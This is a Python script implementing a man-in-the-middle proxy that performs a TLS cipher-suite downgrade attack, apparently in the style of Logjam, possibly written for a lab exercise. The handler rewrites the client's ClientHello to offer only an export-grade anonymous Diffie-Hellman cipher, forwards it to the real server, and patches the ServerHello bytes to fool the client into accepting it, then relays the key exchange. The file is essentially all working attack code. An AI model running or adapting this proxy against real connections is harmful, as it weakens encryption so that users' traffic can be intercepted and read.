import socketserver
import socket
from loguru import logger
import sys

REAL_SERVER_IP = '192.168.0.139'
REAL_SERVER_PORT = 443

class ClientHello:
    def __init__(self, data):
        self.data = data
        self.offset = 0

        # Data for the wrapper TLS1.0 header
        self.content_type = self.parse_data_to_int(1)
        self.version1 = self.parse_data_to_int(2)
        self.length1 = self.parse_data_to_int(2)

        # Data for the actual header
        self.hshake_type = self.parse_data_to_int(1)
        self.length = self.parse_data_to_int(3)
        self.version = self.parse_data_to_int(2)
        self.random = self.parse_data(32)
        self.session_id_len = self.parse_data_to_int(1)
        self.session_id = self.parse_data(self.session_id_len)
        self.cipher_suites_len = self.parse_data_to_int(2)
        self.cipher_suites = [self.parse_data_to_int(2) for _ in range(self.cipher_suites_len // 2)]

        # We do not care so much about compression methods and extensions
        self.compression_methods_len = self.parse_data_to_int(1)
        self.compression_methods = self.parse_data(self.compression_methods_len)
        self.extensions_len = self.parse_data_to_int(2)
        self.extensions = self.parse_data(self.extensions_len)


    def parse_data_to_int(self, size):
        result = int.from_bytes(self.data[self.offset:self.offset + size], 'big')
        self.offset += size
        return result

    def parse_int_to_data(self, value, size):
        self.offset += size
        return value.to_bytes(size, 'big')

    def parse_data(self, size):
        result = self.data[self.offset:self.offset + size]
        self.offset += size
        return result

    def pack(self):
        self.offset = 0

        new_data = b''
        new_data += self.parse_int_to_data(self.content_type, 1) 
        new_data += self.parse_int_to_data(self.version1, 2)
        new_data += self.parse_int_to_data(self.length1, 2)
        new_data += self.parse_int_to_data(self.hshake_type, 1)
        new_data += self.parse_int_to_data(self.length, 3)
        new_data += self.parse_int_to_data(self.version, 2)
        
        new_data += self.random
        self.offset += 32

        
        new_data += self.parse_int_to_data(self.session_id_len, 1)

        new_data += self.session_id
        self.offset += self.session_id_len

        new_data += self.parse_int_to_data(self.cipher_suites_len, 2)
        for i in range(self.cipher_suites_len // 2):
            new_data += self.parse_int_to_data(self.cipher_suites[i], 2)


        new_data += self.parse_int_to_data(self.compression_methods_len, 1)

        new_data += self.compression_methods
        self.offset += self.compression_methods_len

        new_data += self.parse_int_to_data(self.extensions_len, 2)
        
        new_data += self.extensions
        self.offset += self.extensions_len

        # Recalculate header lengths
        self.length1 = len(new_data) - 5
        self.length = len(new_data) - 9

        new_data = new_data[:3] + self.length1.to_bytes(2, 'big') + new_data[5:6] + self.length.to_bytes(3, 'big') + new_data[9:]

        return new_data
        
class ServerHello:
    def __init__(self, data):
        self.offset = 0
        self.content_type = self.parse_data_to_int(data, 1)
        self.version1 = self.parse_data_to_int(data, 2)
        self.length1 = self.parse_data_to_int(data, 2)

        self.hshake_type = self.parse_data_to_int(data, 1)
        self.length = self.parse_data_to_int(data, 3)
        self.version = self.parse_data_to_int(data, 2)


    def parse_data_to_int(self, data, size):
        result = int.from_bytes(data[self.offset:(self.offset + size)], 'big')
        self.offset += size
        return result

#def forge_requested_ciphersuites(client_hello_payload, new_ciphersuites):
#    data = bytearray(client_hello_payload)
#    offset = 1 + 2 + 2 + 1 + 3 + 2 + 32
#    session_id_length = data[offset]
#    offset_


class MyTCPHandler(socketserver.BaseRequestHandler):
    """
    The request handler class for our server.

    It is instantiated once per connection to the server, and must
    override the handle() method to implement communication to the
    client.
    """

    def handle(self):
        # self.request is the TCP socket connected to the client
        self.data = self.request.recv(1024)
        received_hello = ClientHello(self.data)

        logger.info(f'Client sent hello {received_hello.__dict__}')
        
        # Trick the server into thinking client supports only TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
        received_hello.cipher_suites_len = 2
        received_hello.cipher_suites = [0x0014]

        logger.info(f'Forged hello {received_hello.__dict__} {received_hello.pack()}')

        s = socket.socket()
        s.connect((REAL_SERVER_IP, REAL_SERVER_PORT))
        s.sendall(received_hello.pack())

        # Receive the server hello
        server_hello = s.recv(2048)

        # Our client won't accept export-grade ciphers, so trick it that we are using the legit version
        # and we just chose bad DH parameters by accident :)
        server_hello = bytearray(server_hello)
        server_hello[44:46] = b'\x00\x33'
        self.request.sendall(bytes(server_hello))

        
        # client key exchange
        s.sendall(self.request.recv(1024))

        # change cipher spec finished
        self.request.sendall(s.recv(1024))

if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 6666
    REAL_SERVER_IP = sys.argv[1]
    REAL_SERVER_PORT = int(sys.argv[2])
    # Create the server, binding to localhost on port 9999
    with socketserver.TCPServer((HOST, PORT), MyTCPHandler) as server:
        # Activate the server; this will keep running until you
        # interrupt the program with Ctrl-C
        server.serve_forever()
